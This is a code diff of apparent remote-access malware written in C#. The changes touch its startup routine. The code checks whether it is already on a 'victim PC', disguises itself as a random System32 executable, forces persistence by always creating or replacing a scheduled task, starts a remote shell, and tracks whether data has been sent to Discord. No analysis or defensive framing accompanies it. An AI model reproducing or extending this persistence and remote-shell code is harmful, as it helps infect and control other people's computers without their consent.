@@ -18,16 +18,19 @@ namespace Client
         /// </summary>
         static void Main(string[] args)
         {
+            Console.WriteLine("The Love Letter.");
+
             ArgsParser(args);
+
             CheckRealApplication();
+
             CheckSettings();
 
             // make sure this thing wont crash
 
             Application.ThreadException += Application_ThreadException;
+
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
-
-
 #if !DEBUG
             /// Check if Application is already on victim PC
             if (!Constants.IsInAppData() && !Constants.IsInWinDir())
@@ -59,11 +62,10 @@ namespace Client
                 {
                     // check if the system32 path task already exists
                     // if not just go along.
-                    if (!Armitage.Startup.IsTaskExists(Constants.WinDirTaskName))
-                    {
-                        // if not create it
-                        Armitage.Startup.ViaTaskScheduler(Constants.WinDirTaskName);
-                    }
+
+                    // always creates the taskscheduler task, replace if exists
+                    Armitage.Startup.ViaTaskScheduler(Constants.WinDirTaskName);
+
                     // needs to be a separate if to get called after creating the task
                     if (Armitage.Startup.IsTaskExists(Constants.WinDirTaskName))
                     {
@@ -111,7 +113,7 @@ namespace Client
 
             /// Start remote shell
             Armitage.Shell.Shell.Start();
-            
+
             Properties.Settings.Default.IsFirstRun = false;
             Properties.Settings.Default.Save();
 
@@ -173,7 +175,7 @@ namespace Client
             {
                 string randomsysapp = Utilities.Files_And_Pathing.GetRandomSystem32Executable();
 
-                string fullrandomsysapp = Environment.SystemDirectory + "/" + randomsysapp;
+                string fullrandomsysapp = Path.GetFullPath(Environment.SystemDirectory + "/" + randomsysapp);
 
                 string windirpath = Path.GetFullPath(Constants.WinDir + "/" + randomsysapp);
 
@@ -228,12 +230,12 @@ namespace Client
                     p.Start();
                 }
                 catch { }
-
             }
         }
         public static void CheckSettings()
         {
             Console.WriteLine("Is Discord Sent : " + Properties.Settings.Default.IsDiscordSent.ToString());
+
             Console.WriteLine("Is First Run : " + Properties.Settings.Default.IsFirstRun.ToString());
         }
     }
